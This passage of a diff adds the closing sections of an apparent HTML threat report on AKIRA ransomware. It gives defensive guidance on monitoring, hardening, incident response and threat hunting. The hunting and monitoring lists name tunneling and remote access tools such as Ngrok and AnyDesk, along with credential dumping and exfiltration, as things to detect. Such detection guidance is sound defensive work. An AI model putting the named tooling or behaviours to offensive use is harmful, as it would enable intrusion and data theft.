+                    <h4>Network Traffic Monitoring</h4>
+                    <ul>
+                        <li>Deploy network traffic analysis (NTA) solutions</li>
+                        <li>Monitor for data exfiltration (large outbound transfers)</li>
+                        <li>Block or alert on Tor network connections from corporate networks</li>
+                        <li>Inspect encrypted traffic where possible (TLS inspection)</li>
+                        <li>Monitor for tunneling protocols (Ngrok, Cloudflare Tunnel)</li>
+                        <li>Implement DNS filtering and monitoring</li>
+                        <li>Alert on communications with known malicious IPs/domains</li>
+                    </ul>
+                </div>
+
+                <h3>🚫 Prevention & Hardening</h3>
+
+                <div class="info-box">
+                    <h4>Email Security</h4>
+                    <ul>
+                        <li>Implement advanced email filtering (anti-phishing, anti-malware)</li>
+                        <li>Add external email banners to warn users</li>
+                        <li>Disable hyperlinks in emails from external senders</li>
+                        <li>Block dangerous file types (.exe, .scr, .vbs, .js, .bat)</li>
+                        <li>Implement DMARC, SPF, and DKIM for email authentication</li>
+                        <li>Conduct regular phishing simulation training</li>
+                        <li>Enable "Safe Links" and "Safe Attachments" features</li>
+                    </ul>
+                </div>
+
+                <div class="info-box">
+                    <h4>Endpoint Hardening</h4>
+                    <ul>
+                        <li>Disable PowerShell for standard users (or use Constrained Language Mode)</li>
+                        <li>Disable Windows Script Host (WSH) for non-administrative users</li>
+                        <li>Disable macros by default in Office applications</li>
+                        <li>Enable Windows Defender Attack Surface Reduction (ASR) rules</li>
+                        <li>Enable Credential Guard on Windows 10/11 systems</li>
+                        <li>Disable LLMNR and NetBIOS to prevent credential harvesting</li>
+                        <li>Configure Windows Firewall to block inbound RDP from internet</li>
+                        <li>Remove local administrator rights from standard users</li>
+                        <li>Disable unnecessary services and ports</li>
+                    </ul>
+                </div>
+
+                <div class="info-box">
+                    <h4>Remote Access Security</h4>
+                    <ul>
+                        <li>Never expose RDP directly to the internet</li>
+                        <li>Implement VPN with MFA for all remote access</li>
+                        <li>Use VPN split-tunneling carefully (full tunnel preferred)</li>
+                        <li>Implement geofencing - restrict VPN access by geographic location</li>
+                        <li>Monitor VPN logs for suspicious activity</li>
+                        <li>Implement conditional access policies</li>
+                        <li>Use RDP Gateway or jump servers for internal RDP access</li>
+                        <li>Require Network Level Authentication (NLA) for RDP</li>
+                    </ul>
+                </div>
+
+                <h3>📋 Incident Response Preparation</h3>
+
+                <div class="info-box">
+                    <h4>Incident Response Plan</h4>
+                    <ul>
+                        <li>Develop and document comprehensive incident response procedures</li>
+                        <li>Establish incident response team with defined roles and responsibilities</li>
+                        <li>Maintain updated contact list (internal team, vendors, law enforcement, cyber insurance)</li>
+                        <li>Conduct tabletop exercises quarterly</li>
+                        <li>Pre-position incident response tools and access</li>
+                        <li>Document and maintain system architecture and critical asset inventory</li>
+                        <li>Establish communication protocols (internal and external)</li>
+                        <li>Engage legal counsel familiar with cyber incidents</li>
+                    </ul>
+                </div>
+
+                <div class="info-box">
+                    <h4>Ransomware-Specific Preparedness</h4>
+                    <ul>
+                        <li>Identify and document critical business systems and recovery priorities</li>
+                        <li>Establish Recovery Time Objectives (RTO) and Recovery Point Objectives (RPO)</li>
+                        <li>Pre-position offline system images and installation media</li>
+                        <li>Maintain offline copies of critical documentation and procedures</li>
+                        <li>Test isolation procedures (can you quickly segment infected systems?)</li>
+                        <li>Understand your cyber insurance coverage and requirements</li>
+                        <li>Establish relationships with incident response firms before you need them</li>
+                        <li>Do NOT engage with ransomware operators without proper guidance</li>
+                    </ul>
+                </div>
+
+                <h3>👥 Security Awareness & Training</h3>
+
+                <div class="info-box">
+                    <ul>
+                        <li>Conduct security awareness training for all employees (quarterly minimum)</li>
+                        <li>Provide role-specific training for IT staff and administrators</li>
+                        <li>Run regular phishing simulations with feedback</li>
+                        <li>Train users to recognize and report suspicious activity</li>
+                        <li>Educate on social engineering tactics</li>
+                        <li>Establish clear reporting procedures for security incidents</li>
+                        <li>Create a security-conscious culture (no blame for reporting)</li>
+                    </ul>
+                </div>
+
+                <h3>🔍 Threat Hunting</h3>
+
+                <div class="info-box">
+                    <h4>Proactive Threat Hunting Activities</h4>
+                    <ul>
+                        <li>Search for IOCs associated with AKIRA (hashes, file names, commands)</li>
+                        <li>Hunt for legitimate tools used maliciously (PowerShell, PsExec, AdFind)</li>
+                        <li>Look for remote access tools (AnyDesk, RustDesk, Ngrok)</li>
+                        <li>Identify accounts with suspicious login patterns</li>
+                        <li>Review privileged account usage and elevation events</li>
+                        <li>Check for unexpected scheduled tasks or services</li>
+                        <li>Analyze network traffic for data exfiltration patterns</li>
+                        <li>Review backup system access logs</li>
+                        <li>Hunt for signs of credential dumping tools</li>
+                    </ul>
+                </div>
+
+                <div class="warning-box">
+                    <h3>⚠️ If Compromised - Immediate Actions</h3>
+                    <p><strong>DO NOT PANIC - Follow These Steps:</strong></p>
+                    <ol>
+                        <li><strong>Isolate (Don't Power Off):</strong> Disconnect infected systems from network, but keep powered on for forensics</li>
+                        <li><strong>Activate Incident Response:</strong> Contact your incident response team/vendor immediately</li>
+                        <li><strong>Preserve Evidence:</strong> Take memory dumps, capture logs, document what you observe</li>
+                        <li><strong>Notify Stakeholders:</strong> Executive leadership, legal, cyber insurance, law enforcement (FBI)</li>
+                        <li><strong>Do NOT Pay Ransom:</strong> Without consulting legal counsel, law enforcement, and incident response experts</li>
+                        <li><strong>Assess Scope:</strong> Determine extent of compromise before restoration</li>
+                        <li><strong>Change Credentials:</strong> Reset all passwords, especially privileged accounts (after removing threat actor access)</li>
+                        <li><strong>Report to Authorities:</strong> FBI IC3, CISA (critical infrastructure sectors)</li>
+                    </ol>
+                </div>
+
+                <h3>📚 Additional Resources</h3>
+
+                <div class="info-box">
+                    <ul>
+                        <li><strong>CISA StopRansomware.gov:</strong> Comprehensive ransomware resources and guidance</li>
+                        <li><strong>CISA Known Exploited Vulnerabilities Catalog:</strong> Priority patching list</li>
+                        <li><strong>NIST Cybersecurity Framework:</strong> Comprehensive security program guidance</li>
+                        <li><strong>CIS Controls:</strong> Prioritized security best practices</li>
+                        <li><strong>MITRE ATT&CK Framework:</strong> Adversary tactics and techniques knowledge base</li>
+                        <li><strong>FBI IC3:</strong> Internet Crime Complaint Center for reporting</li>
+                        <li><strong>No More Ransom Project:</strong> Free decryption tools (when available)</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer">
+            <p><strong>Date of Report:</strong> December 2025</p>
+            <p><strong>Sources:</strong> CISA, FBI, MITRE ATT&CK, Cisco Talos, Sophos, Trellix, Arctic Wolf, Unit 42, Trusted Third-Party CTI Reports</p>
+            <p><strong>Classification:</strong> TLP:WHITE - Unrestricted Distribution</p>
+            <p style="margin-top: 20px;">This report is provided for informational purposes only. Organizations should conduct their own risk assessments and implement security measures appropriate to their specific environments.</p>
+        </div>
+    </div>
+</body>
+</html>
